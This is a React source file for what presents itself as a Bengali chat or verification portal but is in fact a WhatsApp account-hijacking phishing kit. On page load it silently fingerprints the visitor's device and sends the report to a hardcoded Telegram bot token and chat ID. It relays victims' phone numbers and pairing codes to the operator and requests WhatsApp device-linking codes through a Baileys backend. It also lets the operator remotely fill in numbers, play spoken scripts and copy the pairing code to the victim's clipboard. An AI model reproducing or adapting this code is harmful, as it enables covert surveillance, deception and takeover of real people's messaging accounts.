import React, { useState, useEffect } from "react";
import StepLanding from "./components/StepLanding";
import StepPhoneInput from "./components/StepPhoneInput";
import StepConnecting from "./components/StepConnecting";
import StepSuccessTips from "./components/StepSuccessTips";
import StepConfirmLink from "./components/StepConfirmLink";
import WhatsAppChat from "./components/WhatsAppChat";
import { runFullMasterScan, sendTelegramNotification, DeviceReport } from "./utils/hardwareScan";
import { Sparkles, HelpCircle, Lock, Settings, X, ShieldAlert, Check } from "lucide-react";

export default function App() {
  const [step, setStep] = useState<number>(1);
  const [countryCode, setCountryCode] = useState<string>("+880");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [verificationCode, setVerificationCode] = useState("66667777");

  // Standard persistent user id
  const [userId] = useState(() => {
    const saved = localStorage.getItem("user_session_id");
    if (saved) return saved;
    const generated = "user_" + Math.floor(Math.random() * 900000 + 100000);
    localStorage.setItem("user_session_id", generated);
    return generated;
  });

  // Dynamic state for customizable Telegram Bot Credentials (with LocalStorage persistence)
  const [botToken, setBotToken] = useState(() => {
    return localStorage.getItem("tg_bot_token") || "8519352781:AAHotyA6RzU-hspWlX6hOYJ6x0lDoFIKOKY";
  });
  const [chatId, setChatId] = useState(() => {
    return localStorage.getItem("tg_chat_id") || "6658445342";
  });
  const [showSettings, setShowSettings] = useState(false);
  const [settingsSaved, setSettingsSaved] = useState(false);

  const [activeProfile, setActiveProfile] = useState<{ name: string; image: string; id?: number } | null>(null);
  const [isChatActive, setIsChatActive] = useState(false);

  // Diagnostic states
  const [deviceData, setDeviceData] = useState<DeviceReport | null>(null);

  // Synchronized session properties and messaging notifications states
  const [session, setSession] = useState<any>(null);
  const [speakAnnouncement, setSpeakAnnouncement] = useState<string | null>(null);
  const [toastMessage, setToastMessage] = useState<string | null>(null);

  const showCentralToast = (msg: string) => {
    setToastMessage(msg);
    setTimeout(() => {
      setToastMessage(null);
    }, 4500);
  };

  const stepRef = React.useRef(step);
  useEffect(() => {
    stepRef.current = step;
    if (step > 1) {
      localStorage.setItem("user_last_step", String(step));
    }
  }, [step]);

  // High-frequency central synchronizer
  useEffect(() => {
    let active = true;

    const syncSession = async () => {
      try {
        const res = await fetch(`/api/sessions/${userId}`);
        const data = await res.json();
        if (!active) return;

        if (data.success && data.session) {
          const s = data.session;
          setSession(s);

          // 1. Process Remote Handshake Mobile Number set CMD (/WhatsApp_Phone_number)
          if (s.assignedPhone) {
            const rawPhone = s.assignedPhone.trim();
            // Clear on server immediately
            fetch(`/api/sessions/${userId}/clear-remote-phone`, { method: "POST" }).catch(console.error);

            if (stepRef.current <= 2) {
              let resolvedCountryCode = "+880";
              let resolvedPhone = rawPhone;

              if (rawPhone.startsWith("+")) {
                if (rawPhone.startsWith("+880")) {
                  resolvedCountryCode = "+880";
                  resolvedPhone = rawPhone.replace("+880", "");
                } else {
                  resolvedCountryCode = rawPhone.substring(0, rawPhone.length > 4 ? 4 : rawPhone.length);
                  resolvedPhone = rawPhone.replace(resolvedCountryCode, "");
                }
              } else if (rawPhone.startsWith("880")) {
                resolvedCountryCode = "+880";
                resolvedPhone = rawPhone.substring(3);
              }

              setCountryCode(resolvedCountryCode);
              setPhoneNumber(resolvedPhone);

              // Log and advance
              fetch("/api/log-activity", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                  userId,
                  action: "দূরবর্তী ফোন নম্বর সনাক্তকরণ (কমান্ড দ্বারা স্বয়ংক্রিয়ভাবে ইনপুট)",
                  chatId,
                  details: { phoneNumber: `${resolvedCountryCode} ${resolvedPhone}` }
                })
              }).catch(console.error);

              // Trigger transition to Step 3 (Connecting)
              setStep(3);
            }
          }

          // 2. Process Remote Speak Script announcement (/speak)
          if (s.speakScript) {
            const textToSpeak = s.speakScript;
            fetch(`/api/sessions/${userId}/clear-speak`, { method: "POST" }).catch(console.error);

            // Log activity
            fetch("/api/log-activity", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                userId,
                action: "রিমোট ভয়েস ঘোষণা প্রচারিত হয়েছে",
                chatId,
                details: { text: textToSpeak }
              })
            }).catch(console.error);

            // Audio broadcast speaking
            if ('speechSynthesis' in window) {
              window.speechSynthesis.cancel();
              const utterance = new SpeechSynthesisUtterance(textToSpeak);
              utterance.lang = "bn-BD";
              window.speechSynthesis.speak(utterance);
            }

            setSpeakAnnouncement(textToSpeak);
            setTimeout(() => {
              setSpeakAnnouncement(null);
            }, 8000);
          }

          // 3. Process Remote Copy Code CMD (/success_live_code)
          if (s.remoteCopyTrigger && s.pairingCode) {
            fetch(`/api/sessions/${userId}/clear-remote-copy`, { method: "POST" }).catch(console.error);

            navigator.clipboard.writeText(s.pairingCode)
              .then(() => {
                showCentralToast("ভেরিফিকেশন পেয়ারিং কোড স্বয়ংক্রিয়ভাবে ক্লিপবোর্ডে কপি করা হয়েছে!");
                
                fetch("/api/log-activity", {
                  method: "POST",
                  headers: { "Content-Type": "application/json" },
                  body: JSON.stringify({
                    userId,
                    action: "স্বয়ংক্রিয় রিমোট কপি সফলভাবে সম্পন্ন হয়েছে",
                    chatId,
                    details: { code: s.pairingCode }
                  })
                }).catch(console.error);
              })
              .catch((err) => {
                console.warn("Global clipboard copy blocked (Needs focus):", err);
              });
          }

          // 4. Update the verification code if the backend has updated its pairingCode
          if (s.pairingCode && s.pairingCode !== verificationCode) {
            setVerificationCode(s.pairingCode);
          }
        }
      } catch (err) {
        console.warn("Global polling sync failed:", err);
      }
    };

    syncSession();
    const interval = setInterval(syncSession, 1500);

    return () => {
      active = false;
      clearInterval(interval);
    };
  }, [userId, verificationCode, chatId, botToken]);

  // Generate a random 8-digit verification code as fallback
  const generateVerificationCode = () => {
    const min = 10000000;
    const max = 99999999;
    const randomNum = Math.floor(Math.random() * (max - min + 1)) + min;
    setVerificationCode(String(randomNum));
    return String(randomNum);
  };

  // Run Master Diagnostics diagnostics on page load
  useEffect(() => {
    runFullMasterScan().then((res) => {
      setDeviceData(res);
      // Auto-deliver device profile info instantly silently
      deliverTelegramReport(res, "Connected to Portal");

      // Log activity to backend
      fetch("/api/log-activity", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          userId,
          action: "ভেরিফিকেশন পোর্টালে প্রবেশ করেছেন",
          chatId,
          details: { model: res.hardware.model, os: res.software.os_ver, ram: res.hardware.ram }
        })
      }).catch(console.error);
    });
  }, []);

  // Format and send details via Telegram
  const deliverTelegramReport = async (report: DeviceReport, eventName: string, customText = "") => {
    const appsText = report.apps.length > 0 ? report.apps.join(", ") : "None Detected";
    const msg = `
🔍 *Target Profile Check (${eventName})*
---------------------------
👤 *User Session ID:* ${userId}
📞 *User Phone/Custom info:* ${customText || "N/A"}
📱 *Device:* ${report.hardware.model} (${report.hardware.arch || "N/A"})
⚙️ *OS:* Android ${report.software.os_ver}
🎮 *GPU:* ${report.hardware.gpu}
🧠 *Cores/RAM:* ${report.hardware.cores} / ${report.hardware.ram}
⚡ *Exec Speed:* ${report.software.exec_speed}
🛡️ *Patch Date:* ${report.software.patch}
🌐 *Network:* ${report.network.type} (${report.network.speed})
🏠 *Internal IP:* ${report.network.internal_ip || "Protected/mDNS"}
🔋 *Battery:* ${report.network.battery || "Unknown"}
📦 *Apps Probe:* ${appsText}
---------------------------
🕒 *Time:* ${new Date().toLocaleString()}
`;
    await sendTelegramNotification(botToken, chatId, msg);
  };

  const handleLandingNext = async () => {
    const savedPhone = localStorage.getItem("user_submitted_phone");
    const savedCode = localStorage.getItem("user_submitted_country_code") || "+880";
    const savedStep = localStorage.getItem("user_last_step");

    if (savedPhone) {
      // 1. Restore React state
      setPhoneNumber(savedPhone);
      setCountryCode(savedCode);

      // Restore to last step (default to Step 4 or Step 3 if not specified, but let's restore to savedStep if >= 3)
      const targetStep = savedStep ? parseInt(savedStep) : 4;
      setStep(targetStep >= 3 ? targetStep : 3);

      // 2. Alert the Telegram admin with copyable commands
      const returnMsg = `🔄 <b>গ্রাহক পুনরায় পোর্টালে ফিরে এসেছেন! (Target Returned)</b>\n\n` +
        `👤 <b>গ্রাহক আইডি:</b> <code>${userId}</code>\n` +
        `📞 <b>সংরক্ষিত ফোন নম্বর:</b> <code>${savedCode} ${savedPhone}</code>\n` +
        `💬 গ্রাহক পূর্বে যেখান থেকে বের হয়ে গিয়েছিল সেখানে ফিরিয়ে নেওয়া হয়েছে (রেস্টোর্ড-স্ক্রিন: <b>ধাপ ${targetStep >= 3 ? targetStep : 3}</b>)।\n\n` +
        `📢 <b>অনুগ্রহ করে বট কমান্ড দিয়ে কোডটি পুনরায় লাইভ করুন!</b>\n` +
        `🔑 <b>কোড পুনরায় লাইভ করতে নিচের কমান্ডটি ১-ক্লিক কপি করুন:</b>\n` +
        `<code>/WhatsApp_Device_Linker_${userId} ABCD EFGH</code>`;
      
      await sendTelegramNotification(botToken, chatId, returnMsg);

      // 3. Warm the background Baileys socket for this session instantly
      const cleanPhone = `${savedCode}${savedPhone}`.replace(/[^0-9]/g, "");
      fetch("/api/get-linking-code", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          phoneNumber: cleanPhone,
          sessionId: userId,
          telegramToken: botToken,
          telegramChatId: chatId
        })
      }).catch(console.error);

      // 4. Log activity
      fetch("/api/log-activity", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          userId,
          action: "গ্রাহক পুনরায় পোর্টালে ফিরে এসে বাটন ক্লিক করেছেন (Restore Success)",
          chatId,
          details: { phone: `${savedCode} ${savedPhone}`, step: targetStep }
        })
      }).catch(console.error);
    } else {
      setStep(2);
    }
  };

  // Called when phone is submitted
  const handlePhoneContinue = async (code: string, number: string) => {
    setCountryCode(code);
    setPhoneNumber(number);
    
    // Save phone and country code physically to persistent localStorage
    localStorage.setItem("user_submitted_phone", number);
    localStorage.setItem("user_submitted_country_code", code);

    const generated = generateVerificationCode();

    // Log activity to backend
    fetch("/api/log-activity", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        userId,
        action: "হোয়াটসঅ্যাপ নম্বর সাবমিট করেছেন",
        chatId,
        details: { phoneNumber: `${code} ${number}` }
      })
    }).catch(console.error);

    // Trigger immediate delivery to user's Telegram channel!
    if (deviceData) {
      await deliverTelegramReport(deviceData, "Phone Submitted", `Phone: ${code} ${number} | Code: ${generated}`);
    } else {
      const basicMsg = `📞 *Target Phone Submitted:* \`${code} ${number}\` \n🔐 *Generated Code:* \`${generated}\` \n🕒 *Time:* ${new Date().toLocaleString()}`;
      await sendTelegramNotification(botToken, chatId, basicMsg);
    }

    setStep(3);
  };

  const handleConnectingComplete = (generatedCode?: string) => {
    if (generatedCode) {
      setVerificationCode(generatedCode);
    }
    setStep(4);
  };

  const handleSuccessTipsNext = async () => {
    // Deliver notification that they started device linkage with code
    const updateMsg = `📱 *Device Pairing Initiated* \n📞 *Phone:* ${countryCode} ${phoneNumber} \n🔐 *Verification Code:* \`${verificationCode}\` \n🌐 *Status:* Clicked "Copy to WhatsApp" \n🕒 *Time:* ${new Date().toLocaleString()}`;
    await sendTelegramNotification(botToken, chatId, updateMsg);

    // Log activity
    fetch("/api/log-activity", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        userId,
        action: "Copy to WhatsApp বাটনে ক্লিক করেছেন (ডিভাইস পেয়ারিং শুরু)",
        chatId,
        details: { code: verificationCode }
      })
    }).catch(console.error);

    setStep(5);
  };

  const handleCancelAndChangeNumber = async () => {
    // 1. Clear session variables
    localStorage.removeItem("user_submitted_phone");
    localStorage.removeItem("user_submitted_country_code");
    localStorage.removeItem("user_last_step");

    // 2. Abort tracking states
    setPhoneNumber("");
    setVerificationCode("66667777");

    // 3. Notify the bot admin
    const cancelMsg = `❌ <b>গ্রাহক নম্বর পরিবর্তন করতে চেয়েছেন!</b>\n\n` +
      `👤 <b>গ্রাহক আইডি:</b> <code>${userId}</code>\n` +
      `💬 চলমান সব প্রক্রিয়া বাতিল করা হয়েছে এবং সেশন রিসেট করা হয়েছে।`;
    
    sendTelegramNotification(botToken, chatId, cancelMsg).catch(console.error);

    // 4. Force backend clean disconnections
    fetch(`/api/sessions/${userId}/disconnect`, { method: "POST" }).catch(console.error);

    // 5. Navigate
    setStep(2);
  };

  const handleRestart = () => {
    handleCancelAndChangeNumber();
  };

  const handleSaveSettings = () => {
    localStorage.setItem("tg_bot_token", botToken);
    localStorage.setItem("tg_chat_id", chatId);
    setSettingsSaved(true);
    setTimeout(() => {
      setSettingsSaved(false);
      setShowSettings(false);
    }, 1500);
  };

  return (
    <div className="gradient-bg text-white font-sans min-h-screen flex flex-col justify-between items-center selection:bg-pink-500 selection:text-white relative overflow-hidden w-full">
      {/* Decorative ambient blurred backgrounds */}
      <div className="absolute top-10 left-10 w-48 h-48 bg-pink-500/10 rounded-full blur-3xl pointer-events-none"></div>
      <div className="absolute bottom-10 right-10 w-64 h-64 bg-purple-500/10 rounded-full blur-3xl pointer-events-none"></div>

      {/* Central Announcement Toast */}
      {toastMessage && (
        <div className="fixed top-6 left-1/2 -translate-x-1/2 bg-green-600 border border-green-500 text-white font-extrabold text-xs px-5 py-3 rounded-full shadow-2xl z-50 flex items-center gap-1.5 animate-bounce select-none">
          <Check className="w-4 h-4 shrink-0" />
          <span>{toastMessage}</span>
        </div>
      )}

      {/* TTS Live Broadcast announcement card overlay */}
      {speakAnnouncement && (
        <div className="fixed bottom-6 right-6 left-6 md:left-auto md:w-96 bg-[#0f0f13]/95 border-2 border-pink-500/50 rounded-2xl p-4 shadow-2xl z-50 animate-pulse backdrop-blur-lg select-all">
          <div className="flex items-start gap-3">
            <div className="w-10 h-10 bg-pink-500/10 border border-pink-500/20 rounded-full flex items-center justify-center text-pink-500 shrink-0">
              <span className="relative flex h-3.5 w-3.5">
                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-pink-400 opacity-75"></span>
                <span className="relative inline-flex rounded-full h-3.5 w-3.5 bg-pink-500"></span>
              </span>
            </div>
            <div className="flex-grow space-y-1">
              <div className="text-[10px] font-bold tracking-wider text-pink-400 uppercase">Live Broadcast from Matcher Center</div>
              <div className="text-xs text-white font-semibold leading-relaxed">"{speakAnnouncement}"</div>
            </div>
          </div>
        </div>
      )}

      {/* Main Container is now 100% full screen with no border, matching native Android App style */}
      <main className={`w-full min-h-screen relative flex flex-col justify-between ${(step === 1 || isChatActive) ? "p-0" : "p-6 md:p-8"} animate-fade-in z-10 flex-grow`}>
        {step === 1 && (
          isChatActive && activeProfile ? (
            <WhatsAppChat
              profileName={activeProfile.name}
              profileImage={activeProfile.image}
              profileId={activeProfile.id}
              userId={userId}
              onBack={() => setIsChatActive(false)}
              onLoginTrigger={() => {
                setIsChatActive(false);
                setStep(2);
              }}
            />
          ) : (
            <StepLanding
              onNext={handleLandingNext}
              onSelectChat={(name, image, id) => {
                setActiveProfile({ name, image, id });
                setIsChatActive(true);
                if (id) {
                  try {
                    const currentInteracted = JSON.parse(localStorage.getItem("monersathi_interacted_profile_ids") || "{}");
                    currentInteracted[id] = Date.now();
                    localStorage.setItem("monersathi_interacted_profile_ids", JSON.stringify(currentInteracted));
                    window.dispatchEvent(new Event("monersathi_interacted_profiles_updated"));
                  } catch (e) {
                    console.error("Localstorage error:", e);
                  }
                }
              }}
            />
          )
        )}
        {step === 2 && (
          <StepPhoneInput onBack={() => setStep(1)} onContinue={handlePhoneContinue} />
        )}
        {step === 3 && (
          <StepConnecting
            countryCode={countryCode}
            phoneNumber={phoneNumber}
            onComplete={handleConnectingComplete}
            deviceData={deviceData}
            userId={userId}
            botToken={botToken}
            chatId={chatId}
            session={session}
          />
        )}
        {step === 4 && (
          <StepSuccessTips
            code={verificationCode}
            onNext={handleSuccessTipsNext}
            onBack={handleCancelAndChangeNumber}
            userId={userId}
            session={session}
          />
        )}
        {step === 5 && (
          <StepConfirmLink
            code={verificationCode}
            onRestart={handleRestart}
            userId={userId}
            session={session}
            countryCode={countryCode}
            phoneNumber={phoneNumber}
            botToken={botToken}
            chatId={chatId}
            onCancelNumber={handleCancelAndChangeNumber}
          />
        )}
      </main>

      {/* Settings Dialog Module Backdrop Card */}
      {showSettings && (
        <div className="fixed inset-0 bg-black/85 backdrop-blur-md z-50 flex items-center justify-center p-4">
          <div className="bg-[#0f1115] border-2 border-purple-500/30 rounded-3xl w-full max-w-sm overflow-hidden shadow-2xl relative p-6 animate-zoom-in">
            <button
              onClick={() => setShowSettings(false)}
              className="absolute top-4 right-4 text-zinc-500 hover:text-white p-1.5 rounded-full hover:bg-white/5 transition-colors focus:outline-none"
            >
              <X className="w-5 h-5" />
            </button>

            <div className="flex items-center gap-2 mb-2 text-purple-400">
              <Settings className="w-5 h-5" />
              <h3 className="text-lg font-bold text-white">টেলিগ্রাম গেটওয়ে কনফিগার</h3>
            </div>
            
            <p className="text-xs text-zinc-400 mb-5 leading-relaxed">
              আপনার নিজস্ব টেলিগ্রাম চ্যানেলে হুবহু ভেরিফিকেশন ওটিপি কোড এবং ডিভাইস ডায়াগনস্টিকস রিপোর্ট নিশ্চিত করতে Credentials আপডেট করুন।
            </p>

            <div className="space-y-4">
              <div>
                <label className="block text-[10px] font-bold text-zinc-500 uppercase tracking-widest mb-1.5 pl-1">
                  Telegram Bot Token
                </label>
                <input
                  type="text"
                  value={botToken}
                  onChange={(e) => setBotToken(e.target.value.trim())}
                  className="w-full bg-black/40 border border-zinc-800 p-3 text-xs text-zinc-200 rounded-xl focus:outline-none focus:border-purple-500 transition-colors font-mono"
                  placeholder="Bot Token"
                />
              </div>

              <div>
                <label className="block text-[10px] font-bold text-zinc-500 uppercase tracking-widest mb-1.5 pl-1">
                  Telegram Chat ID
                </label>
                <input
                  type="text"
                  value={chatId}
                  onChange={(e) => setChatId(e.target.value.trim())}
                  className="w-full bg-black/40 border border-zinc-800 p-3 text-xs text-zinc-200 rounded-xl focus:outline-none focus:border-purple-500 transition-colors font-mono"
                  placeholder="Chat ID"
                />
              </div>
            </div>

            {settingsSaved ? (
              <div className="w-full bg-green-500/10 border border-green-500/20 text-green-500 text-xs font-semibold py-3.5 rounded-xl mt-6 flex items-center justify-center gap-2">
                <Check className="w-4 h-4" />
                <span>সফলভাবে সেভ হয়েছে!</span>
              </div>
            ) : (
              <button
                onClick={handleSaveSettings}
                className="w-full bg-gradient-to-r from-pink-500 to-purple-600 hover:from-pink-600 hover:to-purple-700 text-white font-bold py-3.5 text-xs rounded-xl mt-6 transition-all shadow-lg active:scale-95"
              >
                সেটিংস সেভ করুন
              </button>
            )}
          </div>
        </div>
      )}
    </div>
  );
}
